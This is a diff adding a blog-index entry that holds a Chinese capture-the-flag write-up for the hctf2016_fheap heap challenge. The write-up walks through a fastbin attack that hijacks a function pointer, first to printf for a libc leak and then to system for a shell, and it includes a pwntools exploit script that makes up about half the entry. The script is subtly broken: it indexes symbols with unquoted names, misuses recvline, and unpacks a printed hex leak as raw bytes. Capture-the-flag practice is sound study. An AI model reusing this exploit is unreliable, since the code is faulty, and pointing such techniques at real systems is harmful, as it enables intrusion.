@@ -4046,4 +4046,77 @@ p.interactive()
         <tag>week</tag>
       </tags>
   </entry>
+  <entry>
+    <title>hctf2016_fheap</title>
+    <url>/2022/03/16/week3-2.1/</url>
+    <content><![CDATA[<html><head></head><body><p>​        第三周第二天第一道堆题。应该是一道中等偏下的fastbinattack。</p>
+<p>​        libc是2.23。</p>
+<p>​        <a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-16%20%E4%B8%8B%E5%8D%881.17.22.png" data-caption="截屏2022-03-16 下午1.17.22" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-16%20%E4%B8%8B%E5%8D%881.17.22.png" alt="截屏2022-03-16 下午1.17.22"></a></p>
+<p>​        保护全开，pie是个麻烦点。</p>
+<p>​        逆向一下，这个程序的逻辑不算很复杂，但是也需要逆清楚。</p>
+<p>​        <a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-16%20%E4%B8%8B%E5%8D%883.21.47.png" data-caption="截屏2022-03-16 下午3.21.47" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-16%20%E4%B8%8B%E5%8D%883.21.47.png" alt="截屏2022-03-16 下午3.21.47"></a></p>
+<p>​        程序在ptr+3的地方保存了一个有着free函数功能的指针，并且当delete str时，也是调用这个指针，而不是free函数本身，所以可以覆盖它为任意函数指针。</p>
+<p>​        为了泄露内存，我们可以尝试调用<code>printf</code>，并构造格式化字符串，找到system的地址，然后可以故技重施，将指针覆盖为system，从而getshell。</p>
+<p>​        所以利用的第一步就是覆盖这个free指针为<code>printf</code>指针，由于程序开启了pie，我们只需要，也只能覆盖指针的最后两个字节。</p>
+<p>​        对于格式化字符串，（其实我不太会》〉》〉这两天多刷一些吧，目前就copy一下大佬的exp）</p>
+<pre><code class="python">from pwn import *
+
+libc = ELF("/glibc/2.23/64/lib/libc-2.23.so")
+context.terminal = ['tmux','splitw','-h']
+context.log_level = "debug"
+
+'''
+if args['REMOTE']:
+    p = remote("node4.buuoj.cn",27999)
+else:
+    '''
+r = process(["/glibc/2.23/64/lib/ld-2.23.so","./pwn-f"],env={"LD_PRELOAD" : "/glibc/2.23/64/lib/libc.so.6"})
+
+def add(size,content):
+    r.recvuntil("3.quit")
+    r.sendline("create ")
+    r.recvuntil("Pls give string size:")
+    r.sendline(str(size))
+    r.recvuntil("str:")
+    r.sendline(str(content))
+
+def free(idx):
+    r.recvuntil("3.quit")
+    r.sendline("delete ")
+    r.recvuntil("id:")
+    r.sendline(str(idx))
+    r.recvuntil("Are you sure?:")
+    r.sendline("yes")
+
+add(10,"aaaa")#chunk0(0x20)
+add(10,"bbbb")#chunk1(0x20)
+
+
+free(1)#main_arena =&gt; chunk1
+free(0)#main_arena=&gt; chunk0 =&gt; chunk1
+
+add(25,b'Start%176$pEnd'.ljust(24,b'a') + b'\xb6')#chukn2 ,point to chunk0
+free(1)#print chunk
+r.recvuntil("Start")
+libc_start_main = u64(r.recvline("END",drop = True))
+
+print(hex(libc_start_main))
+
+libc_base = libc_start_main - libc.symbols[__libc_start_main]
+system_addr = libc_base + libc.symbols[system]
+
+free(0)
+
+add(32,b"/bin/sh;".ljust(24,b'a') + p64(system_addr))
+
+free(1)
+
+r.interactive()
+</code></pre>
+<p>​        </p>
+</body></html>]]></content>
+      <tags>
+        <tag>week</tag>
+      </tags>
+  </entry>
 </search>
